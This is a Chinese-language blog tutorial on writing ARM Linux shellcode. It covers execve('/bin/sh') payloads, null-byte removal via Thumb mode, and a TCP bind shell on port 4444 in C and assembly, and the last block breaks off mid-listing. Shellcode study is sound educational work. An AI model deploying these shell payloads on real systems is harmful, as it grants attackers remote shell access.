@@ -1,0 +1,383 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ARM Shellcode | P1AIN0&#39;S BLOG</title>
+  
+  
+  <meta name="description" content="系统调用从write说起：
+在linux中的原型为：
+1size_t write(int fd, const void *buf, size_t count);
+
+在c语言中的使用方法如下：
+12const char string[13] = &amp;quot;Hello world\n&amp;quot;;wr">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ARM Shellcode"/>
+  <meta property="og:site_name" content="P1AIN0&#39;S BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/blog/atom.xml" title="P1AIN0&#39;S BLOG" type="application/atom+xml">
+  
+  
+    <link href="/blog/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/blog/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/blog/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/blog/">P1AIN0&#39;S BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/blog/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ARM Shellcode</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>从write说起：</p>
+<p>在linux中的原型为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>在c语言中的使用方法如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">13</span>] = <span class="string">&quot;Hello world\n&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>, <span class="built_in">string</span>, <span class="keyword">sizeof</span>(<span class="built_in">string</span>));        <span class="comment">// Here sizeof(string) is 13</span></span><br></pre></td></tr></table></figure>
+
+<p>把write的系统调用的汇编代码提取出来。如下：</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x000270b0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="number">#96</span>] <span class="comment">; 0x27118</span></span><br><span class="line">   <span class="number">0x000270b4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="built_in">r12</span>]</span><br><span class="line">=&gt; <span class="number">0x000270b8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">teq</span> <span class="built_in">r12</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000270bc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>&#125;  <span class="comment">; (str r7, [sp, #-4]!)</span></span><br><span class="line">   <span class="number">0x000270c0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">bne</span> <span class="number">0x270dc</span> &lt;write+<span class="number">44</span>&gt;</span><br><span class="line">   <span class="number">0x000270c4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#4</span></span><br><span class="line">   <span class="number">0x000270c8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。</p>
+<p>fd – 1 for STDOUT<br>buf – pointer to a string<br>count – number of bytes to write -&gt; 13<br>syscall number of write -&gt; 0x4</p>
+<p>直接使用系统调用的方式：</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#1</span>      <span class="comment">@ fd 1 = STDOUT</span></span><br><span class="line"><span class="keyword">ldr</span>   <span class="built_in">r1</span>, string  <span class="comment">@ loading the string from memory to R1</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#13</span>     <span class="comment">@ write 13 bytes to STDOUT </span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#4</span>      <span class="comment">@ Syscall 0x4 = write()</span></span><br><span class="line"><span class="keyword">svc</span>   <span class="number">#0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-trace-system-call"><a href="#1-trace-system-call" class="headerlink" title="1.trace system call"></a>1.trace system call</h3><p>使用下面的简单例程，然后把它转化成汇编代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strace -f -v &lt;filename&gt;</span><br><span class="line"></span><br><span class="line">execve(&quot;/usr/bin/test&quot;, [&quot;test&quot;], [...]) = 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-system-call-number-and-parameters"><a href="#2-system-call-number-and-parameters" class="headerlink" title="2.system call number and parameters"></a>2.system call number and parameters</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">    execve - execute program</span><br><span class="line">SYNOPSIS</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x000264d0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>, <span class="built_in">lr</span>&#125;</span><br><span class="line">   <span class="number">0x000264d4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">0x000264d8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">0x000264dc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">cmn</span> <span class="built_in">r0</span>, <span class="number">#4096</span> <span class="comment">; 0x1000</span></span><br><span class="line">   <span class="number">0x000264e0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r3</span>, <span class="built_in">r0</span></span><br><span class="line">   <span class="number">0x000264e4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">bhi</span> <span class="number">0x264f0</span> &lt;execve+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x000264e8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r3</span></span><br><span class="line">   <span class="number">0x000264ec</span> &lt;+<span class="number">28</span>&gt;: <span class="keyword">pop</span> &#123;<span class="built_in">r7</span>, <span class="built_in">pc</span>&#125;</span><br><span class="line">   <span class="number">0x000264f0</span> &lt;+<span class="number">32</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="number">#20</span>] <span class="comment">; 0x2650c &lt;execve+60&gt;</span></span><br><span class="line">   <span class="number">0x000264f4</span> &lt;+<span class="number">36</span>&gt;: <span class="keyword">rsb</span> <span class="built_in">r1</span>, <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000264f8</span> &lt;+<span class="number">40</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="built_in">r2</span>]</span><br><span class="line">   <span class="number">0x000264fc</span> &lt;+<span class="number">44</span>&gt;: <span class="keyword">bl</span> <span class="number">0x11520</span> &lt;__aeabi_read_tp&gt;</span><br><span class="line">   <span class="number">0x00026500</span> &lt;+<span class="number">48</span>&gt;: <span class="keyword">mvn</span> <span class="built_in">r3</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x00026504</span> &lt;+<span class="number">52</span>&gt;: <span class="keyword">str</span> <span class="built_in">r1</span>, [<span class="built_in">r0</span>, <span class="built_in">r2</span>]</span><br><span class="line">   <span class="number">0x00026508</span> &lt;+<span class="number">56</span>&gt;: <span class="keyword">b</span> <span class="number">0x264e8</span> &lt;execve+<span class="number">24</span>&gt;</span><br><span class="line">   <span class="number">0x0002650c</span> &lt;+<span class="number">60</span>&gt;: <span class="keyword">andeq</span> <span class="built_in">r0</span>, <span class="built_in">r7</span>, <span class="built_in">r0</span>, <span class="keyword">asr</span> <span class="number">#31</span></span><br></pre></td></tr></table></figure>
+
+<p>syscall为11</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">execve:</span>     file format elf32-littlearm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">Disassembly</span> of section <span class="meta">.text</span>:</span><br><span class="line"></span><br><span class="line"><span class="number">00010054</span> &lt;_start&gt;:</span><br><span class="line">   <span class="number">10054</span>: e28f000c <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#12</span></span><br><span class="line">   <span class="number">10058</span>: e3a01000 <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">1005</span>c: e3a02000 <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">10060</span>: e3a0700b <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">10064</span>: ef000000 <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">10068</span>: <span class="number">6</span>e69622f <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line">   <span class="number">1006</span>c: <span class="number">0068732</span>f <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还是有很多NULL字符在里头的。</p>
+<h3 id="3-去除NULL字符数据"><a href="#3-去除NULL字符数据" class="headerlink" title="3. 去除NULL字符数据"></a>3. 去除NULL字符数据</h3><p>我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">        <span class="meta">.code</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line">        <span class="keyword">bx</span>  <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">.code</span> <span class="number">16</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line">        <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">        <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r5</span>, <span class="built_in">r5</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/sh\0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>去空后，效果还是不错的。</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10054</span>: e28f3001  <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span></span><br><span class="line"><span class="number">10058</span>: e12fff13  <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"><span class="number">1005</span>c: a002       <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">pc</span>, <span class="number">#8</span> <span class="comment">; (adr r0, 10068 &lt;_start+0x14&gt;)</span></span><br><span class="line"><span class="number">1005</span>e: <span class="number">4049</span>       <span class="keyword">eors</span> <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"><span class="number">10060</span>: <span class="number">4052</span>       <span class="keyword">eors</span> <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"><span class="number">10062</span>: <span class="number">270</span>b       <span class="keyword">movs</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line"><span class="number">10064</span>: df01       <span class="keyword">svc</span> <span class="number">1</span></span><br><span class="line"><span class="number">10066</span>: <span class="number">1</span>c2d       <span class="keyword">adds</span> <span class="built_in">r5</span>, <span class="built_in">r5</span>, <span class="number">#0</span></span><br><span class="line"><span class="number">10068</span>: <span class="number">6</span>e69622f  <span class="meta">.word</span> <span class="number">0x6e69622f</span></span><br><span class="line"><span class="number">1006</span>c: <span class="number">0068732</span>f  <span class="meta">.word</span> <span class="number">0x0068732f</span></span><br></pre></td></tr></table></figure>
+
+<p>提取shellcode：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary execve3 execve3.bin </span><br></pre></td></tr></table></figure>
+
+<h2 id="bind-shell-to-tcp"><a href="#bind-shell-to-tcp" class="headerlink" title="bind shell to tcp"></a>bind shell to tcp</h2><p>过程：</p>
+<p>创建新的TCP套接字<br>绑定socket到本地端口<br>等待传入的连接<br>接受传入的连接<br>将STDIN STDOUT STDERR从客户端重定向到新创建的套接字<br>生成shell</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> host_sockid;    <span class="comment">// socket file descriptor </span></span><br><span class="line"><span class="keyword">int</span> client_sockid;  <span class="comment">// client file descriptor </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hostaddr</span>;</span>            <span class="comment">// server aka listen address</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="comment">// Create new TCP socket </span></span><br><span class="line">    host_sockid = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize sockaddr struct to bind socket using it </span></span><br><span class="line">    hostaddr.sin_family = AF_INET;                  <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line">    hostaddr.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);                <span class="comment">// server port, converted to network byte order</span></span><br><span class="line">    hostaddr.sin_addr.s_addr = <span class="built_in">htonl</span>(INADDR_ANY);   <span class="comment">// listen to any address, converted to network byte order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to IP/Port in sockaddr struct </span></span><br><span class="line">    <span class="built_in">bind</span>(host_sockid, (struct sockaddr*) &amp;hostaddr, <span class="built_in"><span class="keyword">sizeof</span></span>(hostaddr)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listen for incoming connections </span></span><br><span class="line">    <span class="built_in">listen</span>(host_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Accept incoming connection </span></span><br><span class="line">    client_sockid = <span class="built_in">accept</span>(host_sockid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Duplicate file descriptors for STDIN, STDOUT and STDERR </span></span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">0</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">1</span>); </span><br><span class="line">    <span class="built_in">dup2</span>(client_sockid, <span class="number">2</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute /bin/sh </span></span><br><span class="line">    <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="built_in">close</span>(host_sockid); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>R7</th>
+<th>R0</th>
+<th>R1</th>
+<th>R2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Socket</td>
+<td>281</td>
+<td>2</td>
+<td>1</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Bind</td>
+<td>282</td>
+<td>host_sockid</td>
+<td>(struct sockaddr*) &amp;hostaddr</td>
+<td>16</td>
+</tr>
+<tr>
+<td>Listen</td>
+<td>284</td>
+<td>host_sockid</td>
+<td>2</td>
+<td>–</td>
+</tr>
+<tr>
+<td>Accept</td>
+<td>285</td>
+<td>host_sockid</td>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Dup2</td>
+<td>63</td>
+<td>client_sockid</td>
+<td>0 / 1 / 2</td>
+<td>–</td>
+</tr>
+<tr>
+<td>Execve</td>
+<td>11</td>
+<td>“/bin/sh”</td>
+<td>0</td>
+<td>0</td>
+</tr>
+</tbody></table>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">    <span class="meta">.ARM</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>         <span class="comment">// switch to thumb mode </span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#200</span>        <span class="comment">// r7 = 281 (socket)</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 value needs to be split </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>              <span class="comment">// r0 = host_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save host_sockid in r4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bind(r0, &amp;sockaddr, 16)</span></span><br><span class="line">    <span class="keyword">adr</span>  <span class="built_in">r1</span>, struct_addr <span class="comment">// pointer to address, port</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]    <span class="comment">// replace 1 with 0 in x.1.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#5</span>]    <span class="comment">// replace 1 with 0 in 0.x.1.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#6</span>]    <span class="comment">// replace 1 with 0 in 0.0.x.1</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#7</span>]    <span class="comment">// replace 1 with 0 in 0.0.0.x</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r2</span>, <span class="number">#16</span>          <span class="comment">// struct address length</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 282 (bind) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 